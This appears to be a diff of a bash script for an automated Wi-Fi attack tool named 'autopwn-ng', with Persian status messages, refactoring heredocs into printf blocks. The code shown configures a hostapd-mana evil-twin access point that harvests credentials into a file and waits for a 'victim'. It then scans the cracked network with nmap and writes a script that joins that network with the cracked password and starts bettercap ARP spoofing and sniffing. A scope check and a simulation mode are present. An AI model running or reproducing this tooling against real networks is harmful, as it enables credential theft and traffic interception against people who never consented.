@@ -690,9 +690,7 @@ if [ "$OFFLINE" -eq 1 ] && [ "$DRY_RUN" -ne 1 ] && [ ! -s "$CAP" ]; then
 fi
 
 print_plan() {
-  cat <<'PLAN'
-SIMULATION MODE: autopwn-ng dry-run / --simulate
-PLAN
+  echo "SIMULATION MODE: autopwn-ng dry-run / --simulate"
   echo
   cat <<PLAN
 Profile: $PROFILE
@@ -1297,17 +1295,17 @@ if [ "$SKIP_TO" -le 6 ] && [ "$DO_TWIN" -eq 1 ] && [ -n "$IFACE2" ] && ! [ -s "$
       if ! in_scope "$TGT" "$ESS"; then
         warn "هدف twin ($TGT/$ESS) خارج از scope — رد شد."
       else
-      cat > "$WORK/mana.conf" <<EOF
-interface=$IFACE2
-driver=nl80211
-ssid=$ESS
-channel=6
-hw_mode=g
-mana_wpe=1
-mana_credout=$WORK/creds.txt
-mana_eapsuccess=1
-mana_macacl=0
-EOF
+      {
+        printf 'interface=%s\n' "$IFACE2"
+        printf 'driver=nl80211\n'
+        printf 'ssid=%s\n' "$ESS"
+        printf 'channel=6\n'
+        printf 'hw_mode=g\n'
+        printf 'mana_wpe=1\n'
+        printf 'mana_credout=%s\n' "$WORK/creds.txt"
+        printf 'mana_eapsuccess=1\n'
+        printf 'mana_macacl=0\n'
+      } > "$WORK/mana.conf"
       hostapd-mana "$WORK/mana.conf" > "$WORK/mana.log" 2>&1 &
       TWIN_PID=$!
       ok "AP قلابی «$ESS» روی $IFACE2 بالا آمد. منتظر قربانی..."
@@ -1335,8 +1333,7 @@ if [ "$SKIP_TO" -le 7 ] && [ "$DO_POST" -eq 1 ] && [ "$OFFLINE" -ne 1 ] && [ -s 
   hr; c "فاز ۶ — آماده‌سازی post-exploit"
   first=$(head -1 "$WORK/cracked.txt")
   b=$(cut -d'|' -f1 <<<"$first"); p=$(cut -d'|' -f2 <<<"$first")
-  # تشخیص subnet واقعی شبکهٔ کرک‌شده (best-effort, چند روش)
-    # تشخیص subnet: اتصال موقت + fallback (top-level helper)
+  # تشخیص subnet واقعی شبکهٔ کرک‌شده (best-effort)
   c "  → تشخیص subnet (via $IFACE2)"
   SUBNET=$(detect_subnet)
   if [ "$SUBNET" = "192.168.1.0/24" ]; then
@@ -1344,20 +1341,17 @@ if [ "$SKIP_TO" -le 7 ] && [ "$DO_POST" -eq 1 ] && [ "$OFFLINE" -ne 1 ] && [ -s 
   else
     ok "subnet تشخیص داده شد: $SUBNET"
   fi
-  # nmap: اسکن شبکهٔ کرک‌شده برای شناسایی سرویس‌ها
-  if command -v nmap >/dev/null; then
-    c "  → nmap اسکن شبکه ($SUBNET)"
-    nmap -sn "$SUBNET" -oN "$REPORT/nmap-hosts.txt" 2>/dev/null || true
-    nmap -sV -p 22,80,443,445,3389,8080 "$SUBNET" -oN "$REPORT/nmap-services.txt" 2>/dev/null || true
-    ok "نتایج nmap: $REPORT/nmap-hosts.txt"
-  fi
-  cat > "$REPORT/connect.sh" <<EOF
-#!/usr/bin/env bash
-# اتصال به شبکه کرک‌شده و شروع MITM
-nmcli dev wifi connect "$b" password "$p"
-sleep 5
-sudo bettercap -iface "$IFACE" -eval 'set arp.spoof.fullduplex true; arp.spoof on; net.sniff on'
-EOF
+  c "  → nmap اسکن شبکه ($SUBNET)"
+  nmap -sn "$SUBNET" -oN "$REPORT/nmap-hosts.txt" 2>/dev/null || true
+  nmap -sV -p 22,80,443,445,3389,8080 "$SUBNET" -oN "$REPORT/nmap-services.txt" 2>/dev/null || true
+  ok "نتایج nmap: $REPORT/nmap-hosts.txt"
+  {
+    printf '#!/usr/bin/env bash\n'
+    printf '# اتصال به شبکه کرک‌شده و شروع MITM\n'
+    printf 'nmcli dev wifi connect %q password %q\n' "$b" "$p"
+    printf 'sleep 5\n'
+    printf 'sudo bettercap -iface %q -eval %q\n' "$IFACE" 'set arp.spoof.fullduplex true; arp.spoof on; net.sniff on'
+  } > "$REPORT/connect.sh"
   chmod +x "$REPORT/connect.sh"
   ok "اسکریپت اتصال + bettercap: $REPORT/connect.sh"
   # استخراج پیکربندی محلی (TR-064/UPnP, SNMP, Telnet/SSH, Web, Cloud, WPS)
